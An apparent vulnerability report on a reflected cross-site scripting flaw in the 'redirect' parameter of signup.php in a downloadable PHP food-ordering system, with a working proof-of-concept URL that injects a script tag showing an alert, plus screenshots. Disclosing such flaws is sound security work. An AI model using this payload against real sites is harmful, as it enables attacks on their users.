vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

Vulnerability trigger parameter: $redirect

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/212480988-323be7d4-9e89-4354-8b34-0a50f98f1071.png)
http://192.168.249.88/php-fos-db/signup.php?redirect=%3C/script%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
![image](https://user-images.githubusercontent.com/30823782/212481187-b3cb3675-e448-4941-a3e3-8e0d82944fef.png)


